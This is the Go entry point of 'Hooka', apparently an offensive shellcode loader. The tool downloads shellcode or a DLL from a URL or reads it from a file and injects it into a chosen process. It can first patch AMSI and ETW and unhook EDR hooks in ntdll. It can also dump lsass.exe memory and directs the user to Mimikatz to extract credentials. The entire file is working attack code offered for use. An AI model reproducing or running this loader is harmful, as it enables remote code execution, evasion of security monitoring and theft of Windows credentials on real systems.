package main

import (
  "os"
  "time"
  "flag"
  "strings"
  "encoding/hex"
  "encoding/base64"

  "github.com/D3Ext/Hooka/pkg/hooka"

  l "github.com/D3Ext/maldev/logging"
)

func main() {
  var shellcode []byte
  var err error

  /*err = hooka.AutoCheck()
  if err != nil {
    l.Fatal(err)
  }*/

  // Parse CLI flags and retrieve values
  sc_url, sc_file, dll_file, dll_url, technique, hook_detect, halos, unhook, base64_flag, hex_flag, test_flag, amsi, etw, lsass, pid := hooka.ParseFlags()

  l.PrintBanner("Hooka!")
  l.Println(" by D3Ext - v0.1")
  time.Sleep(100 * time.Millisecond)

  if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url == "") && (!hook_detect) && (!test_flag) && (lsass == "") {
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Parameters missing")
    l.Println("[*] Provide a shellcode to inject (--file/--url/--dll), detect hooked functions (--hooks), test program capabilities (--test) or dump lsass.exe process (--lsass)\n")
    os.Exit(0)

  } else if (sc_url != "") && (sc_file != "") && (dll_file == "") && (dll_url == "") { // Check if both --url and --file flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --url and --file at the same time!\n")

  } else if (sc_url != "") && (sc_file == "") && (dll_file != "") && (dll_url == "") { // Check if both --url and --dll flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --url and --dll at the same time!\n")

  } else if (sc_url == "") && (sc_file != "") && (dll_file != "") && (dll_url == "") { // Check if both --file and --dll flags were passed
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --file and --dll at the same time!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") && (dll_url != "") {
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --dll and --remote-dll at the same time!\n")

  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") && (dll_url != "") {
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --url and --remote-dll at the same time!\n")

  } else if (sc_url == "") && (sc_file != "") && (dll_file == "") && (dll_url != "") {
    l.Println()
    flag.PrintDefaults()
    l.Println("\n[-] Error: you can't use --file and --remote-dll at the same time!\n")

  } else if (sc_url != "") && (sc_file == "") && (dll_file == "") && (dll_url == "") {

    if (base64_flag) && (hex_flag) { // Check if both flags were passed
      l.Println()
      flag.PrintDefaults()
      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
      os.Exit(0)
    }

    if (unhook != 1) && (unhook != 2) && (unhook != 3) && (unhook != 0) { // Check if user provided a non allowed value
      l.Println("\n[-] Unknown unhooking technique! Allowed values: 1=classic, 2=full, 3=Perun's Fart\n")
      os.Exit(0)
    }

    time.Sleep(200 * time.Millisecond)
    l.Println("\n[+] Remote shellcode URL: " + sc_url)
    time.Sleep(200 * time.Millisecond)
    if (pid != 0 ){
      l.Println("[+] Target PID:", pid)
    } else {
      l.Println("[+] Target PID: self")
    }
    time.Sleep(200 * time.Millisecond)

    if (!base64_flag) && (!hex_flag) { // Check shellcode encoding flags
      l.Println("[+] No encoding was especified")
    } else if (base64_flag) && (!hex_flag) {
      l.Println("[+] Shellcode encoding: base64")
    } else if (!base64_flag) && (hex_flag) {
      l.Println("[+] Shellcode encoding: hex")
    }
    time.Sleep(300 * time.Millisecond)

    l.Println("[*] Retrieving shellcode from url...")
    shellcode, err = hooka.GetShellcodeFromUrl(sc_url)
    if err != nil { // Handle error
      l.Println("[-] An error has ocurred retrieving shellcode!")
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)

    if (base64_flag) && (!hex_flag) { // Decode shellcode if necessary
      l.Println("[*] Decoding shellcode...")
      shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }
      time.Sleep(300 * time.Millisecond)

    } else if (!base64_flag) && (hex_flag) {
      l.Println("[*] Decoding shellcode...")
      shellcode, err = hex.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }
      time.Sleep(300 * time.Millisecond)
    }

    checkAmsi(amsi)

    checkEtw(etw)

    checkUnhook(unhook, technique)

    time.Sleep(300 * time.Millisecond)
    if (technique != "") {
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    if (halos) { // Check if --halos flag was used
      err := hooka.InjectHalos(shellcode, technique, pid)
      if err != nil {
        l.Fatal(err)
      }

    } else {
      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
      if err != nil { // Handle error
        l.Fatal(err)
      }
    }
    
    time.Sleep(100 * time.Millisecond)
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_file != "") && (sc_url == "") && (dll_file == "") && (dll_url == "") {

    if (base64_flag) && (hex_flag) { // Check if both flags were passed
      l.Println()
      flag.PrintDefaults()
      l.Println("\n[-] Error: you can't use base64 and hex encoding flag at the same time!\n")
      os.Exit(0)
    }

    _, err := os.Stat(sc_file) // Check if file exists
    if os.IsNotExist(err) {
      l.Println("\n[-] Especified file doesn't exist!\n")
      time.Sleep(100 * time.Millisecond)
      os.Exit(0)
    }

    time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
    if (pid != 0 ){
      l.Println("\n[+] Target PID:", pid)
    } else {
      l.Println("\n[+] Target PID: self")
    }
    time.Sleep(200 * time.Millisecond)
    l.Println("\n[+] Shellcode file: " + sc_file)
    time.Sleep(300 * time.Millisecond)
    l.Println("[*] Getting shellcode from file...")
    time.Sleep(300 * time.Millisecond)

    shellcode, err = hooka.GetShellcodeFromFile(sc_file) // Read file and retrieve shellcode as bytes
    if err != nil { // Handle error
      l.Fatal(err)
    }

    if (!base64_flag) && (!hex_flag) { // Check shellcode encoding flags
      l.Println("[+] No encoding was especified")
      time.Sleep(300 * time.Millisecond)

    } else if (base64_flag) && (!hex_flag) {
      l.Println("[+] Shellcode encoding: base64")
      shellcode, err = base64.StdEncoding.DecodeString(string(shellcode))
      if err != nil {
        l.Fatal(err)
      }

      time.Sleep(300 * time.Millisecond)
      l.Println("[*] Decoding shellcode")
      time.Sleep(300 * time.Millisecond)

    } else if (!base64_flag) && (hex_flag) {
      l.Println("[+] Shellcode encoding: hex")
      shellcode, err = hex.DecodeString(string(shellcode))
      if err != nil { // Handle error
        l.Fatal(err)
      }

      time.Sleep(300 * time.Millisecond)
      l.Println("[*] Decoding shellcode")
      time.Sleep(300 * time.Millisecond)
    }

    checkAmsi(amsi)

    checkEtw(etw)

    checkUnhook(unhook, technique)

    time.Sleep(300 * time.Millisecond)
    if (technique != "") {
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    if (halos) { // Check if --halos flag was used
      err := hooka.InjectHalos(shellcode, technique, pid)
      if err != nil {
        l.Fatal(err)
      }

    } else {
      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
      if err != nil { // Handle error
        l.Fatal(err)
      }
    }
    
    time.Sleep(100 * time.Millisecond)
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file != "") && (dll_url == "") {

    var dll_filename string
    var dll_func string

    if strings.Contains(dll_file, ",") { // Check if a function was especified
      dll_filename = strings.Split(dll_file, ",")[0] // Get DLL path
      dll_func = strings.Split(dll_file, ",")[1] // Get DLL function to execute
    } else {
      dll_filename = dll_file
      dll_func = ""
    }

    _, err := os.Stat(dll_filename) // Check if especified dll exists
    if os.IsNotExist(err) {
      l.Println("\n[-] Especified DLL doesn't exists!\n")
      time.Sleep(100 * time.Millisecond)
      os.Exit(0)
    }

    if (technique != "CreateRemoteThread") && (technique != "CreateProcess") && (technique != "Fibers") && (technique != "QueueApcThread") && (technique != "UuidFromString") && (technique != "") {
      l.Println()
      flag.PrintDefaults()
      l.Println("\n[-] Unknown injection technique! See help panel\n")
      os.Exit(0)
    }

    if (pid != 0 ){
      l.Println("\n[+] Target PID:", pid)
    } else {
      l.Println("\n[+] Target PID: self")
    }
    time.Sleep(200 * time.Millisecond) // Add some delay to let the user read info
    l.Println("[+] DLL file: " + dll_filename)
    time.Sleep(300 * time.Millisecond)
    if (dll_func != "") {
      l.Println("[+] Function to execute: " + dll_func)
    } else {
      l.Println("[+] Function to execute: default")
    }
    time.Sleep(300 * time.Millisecond)

    l.Println("[*] Converting " + dll_filename + " to shellcode")
    shellcode, err := hooka.ConvertDllToShellcode(dll_filename, dll_func, "") // Convert DLL to shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)
    l.Println("[+] Process finished successfully!")
    time.Sleep(200 * time.Millisecond)

    checkAmsi(amsi)

    checkEtw(etw)

    checkUnhook(unhook, technique)

    time.Sleep(300 * time.Millisecond)
    if (technique != "") { // Check if technique has value so it doesn't get printed twice
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    if (halos) {
      err = hooka.InjectHalos(shellcode, technique, pid)
      if err != nil {
        l.Fatal(err)
      }

    } else {
      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
      if err != nil { // Handle error
        l.Fatal(err)
      }
    }

    time.Sleep(100 * time.Millisecond)
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (dll_url != "") {

    var dll_func string
    var dll_url string

    if len(strings.Split(dll_url, ",")) >= 2 {
      dll_func = strings.Split(dll_url, ",")[1]
      dll_url = strings.Split(dll_url, ",")[0]
    } else {
      dll_func = ""
      dll_url = strings.Split(dll_url, ",")[0]
    }

    if (pid != 0 ){
      l.Println("\n[+] Target PID:", pid)
    } else {
      l.Println("\n[+] Target PID: self")
    }

    time.Sleep(200 * time.Millisecond)
    if (dll_func != "") {
      l.Println("[+] Function to execute: " + dll_func)
    } else {
      l.Println("[+] Function to execute: default")
    }
    time.Sleep(300 * time.Millisecond)

    l.Println("[*] Retrieving DLL from url...")
    dll_bytes, err := hooka.GetShellcodeFromUrl(dll_url)
    if err != nil { // Handle error
      l.Println("[-] An error has ocurred retrieving remote dll!")
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)
    
    l.Println("[*] Converting raw bytes to shellcode")
    shellcode, err := hooka.ConvertDllBytesToShellcode(dll_bytes, dll_func, "") // Convert DLL to shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    time.Sleep(300 * time.Millisecond)
    l.Println("[+] DLL converted successfully!")
    time.Sleep(200 * time.Millisecond)

    checkAmsi(amsi)

    checkEtw(etw)

    checkUnhook(unhook, technique)

    time.Sleep(300 * time.Millisecond)
    if (technique != "") { // Check if technique has value so it doesn't get printed twice
      l.Println("[*] Injecting DLL shellcode using " + technique + " technique")
    }

    if (halos) {
      err = hooka.InjectHalos(shellcode, technique, pid)
      if err != nil {
        l.Fatal(err)
      }

    } else {
      err = hooka.Inject(shellcode, technique, pid) // Inject shellcode w/o halo's gate
      if err != nil { // Handle error
        l.Fatal(err)
      }
    }

    time.Sleep(200 * time.Millisecond)
    l.Println("[+] Shellcode should have been executed without errors!\n")

  } else if (sc_url == "") && (sc_file == "") && (dll_file == "") && (hook_detect) { // Enter here if --hooks flag was especified

    l.Println("\n[*] Detecting hooked functions...")

    all_hooks, err := hooka.DetectHooks() // Get all hooked functions
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Process finished")

    if len(all_hooks) >= 1 { // Check if hooks array contains at least one function
      time.Sleep(200 * time.Millisecond)
      l.Println("[*] Hooked functions:\n")
      for _, h := range all_hooks {
        l.Println(h)
      }
      l.Println()
      time.Sleep(200 * time.Millisecond)

    } else {
      time.Sleep(200 * time.Millisecond)
      l.Println("[+] No function is hooked!\n")
      time.Sleep(100 * time.Millisecond)
    }

  } else if (sc_url == "") && (sc_file == "") && (!hook_detect) && (test_flag) {
    
    l.Println("\n[*] Testing with calc.exe shellcode")
    time.Sleep(200 * time.Millisecond)

    checkAmsi(amsi)

    checkEtw(etw)

    checkUnhook(unhook, technique)

    if (technique != "") {
      l.Println("[*] Injecting shellcode using " + technique + " technique")
    }

    err := hooka.Inject(hooka.CalcShellcode(), technique, pid) // Inject calc.exe shellcode
    if err != nil { // Handle error
      l.Fatal(err)
    }
    l.Println("[+] Shellcode should have been executed!\n")

  } else if (lsass != "") { // Enter here if --lsass flag was especified

    if (unhook != 0) {
      l.Println("\n[*] Unhooking MiniDumpWriteDump from dbghelp32.dll")
      time.Sleep(200 * time.Millisecond)
      err := hooka.ClassicUnhook("MiniDumpWriteDump", "C:\\Windows\\System32\\Dbghelp.dll")
      if err != nil {
        l.Fatal(err)
      }
    }

    l.Println("[*] Dumping lsass.exe process to " + lsass)
    
    err := hooka.DumpLsass(lsass)
    if err != nil { // Handle error
      l.Println("[-] An error has ocurred, ensure to be running as admin:")
      e := os.Remove(lsass)
      if e != nil {
        l.Fatal(e)
      }

      l.Fatalln(err)
    }

    info, err := os.Stat(lsass)
    if err != nil {
      l.Fatalln(err)
    }

    l.Println("[*]", info.Size(), "bytes were written to file")
    time.Sleep(100 * time.Millisecond)
    l.Println("[+] Process finished! Now use Mimikatz in your machine to extract credentials\n")
    time.Sleep(100 * time.Millisecond)

  }

}

func checkAmsi(check bool) {
  if (check) {
    l.Println("[*] Patching AMSI by overwriting AmsiScanBuffer memory address...")
    time.Sleep(200 * time.Millisecond)
    err := hooka.PatchAmsi()
    if err != nil {
      l.Println("[-] An error has ocurred while overwriting memory!")
      l.Fatal(err)
    }
    time.Sleep(200 * time.Millisecond)
  }
}

func checkEtw(check bool) {
  if (check) {
    l.Println("[*] Patching ETW by overwriting some EtwEventWrite functions memory address...")
    time.Sleep(200 * time.Millisecond)
    err := hooka.PatchEtw()
    if err != nil {
      l.Println("[-] An error has ocurred while overwriting memory!")
      l.Fatal(err)
    }
    time.Sleep(200 * time.Millisecond)
  }
}

func checkUnhook(unhook int, technique string) {
  // Unhook function(s)
  var func_to_unhook string
  var lib string

  if (unhook == 1) {
    l.Println("[*] Unhooking functions via Classic technique...")
    time.Sleep(200 * time.Millisecond)

    if (technique == "CreateRemoteThread") {
      func_to_unhook = "CreateRemoteThreadEx"
      lib = "C:\\Windows\\System32\\ntdll.dll"
    } else if (technique == "CreateProcess") {
      func_to_unhook = "NtQueryInformationProcess"
      lib = "C:\\Windows\\System32\\ntdll.dll"
    } else if (technique == "EarlyBirdApc") {
      func_to_unhook = "QueueUserAPC"
      lib = "C:\\Windows\\System32\\kernel32.dll"
    } else if (technique == "Fibers") {
      func_to_unhook = "RtlCopyMemory"
      lib = "C:\\Windows\\System32\\ntdll.dll"
    } else if (technique == "UuidFromString") {
      func_to_unhook = "UuidFromStringA"
      lib = "C:\\Windows\\System32\\Rpcrt4.dll"
    }

    err := hooka.ClassicUnhook(func_to_unhook, lib)
    if err != nil {
      l.Println("[-] An error has ocurred while unhooking functions!")
      l.Fatal(err)
    }
    l.Println("[+] Functions have been unhooked!")

  } else if (unhook == 2) {
    l.Println("[*] Unhooking functions via Full Dll technique...")
    time.Sleep(200 * time.Millisecond)
    err := hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
    if err != nil {
      l.Println("[-] An error has ocurred while unhooking functions!")
      l.Fatal(err)
    }
    l.Println("[+] Functions have been unhooked!")

  } else if (unhook == 3) {
    l.Println("[*] Unhooking functions via Perun's Fart technique...")
    time.Sleep(200 * time.Millisecond)
    err := hooka.PerunsUnhook()
    if err != nil {
      l.Println("[-] An error has ocurred while unhooking functions!")
      l.Fatal(err)
    }
    l.Println("[+] Functions have been unhooked!")
  }
}



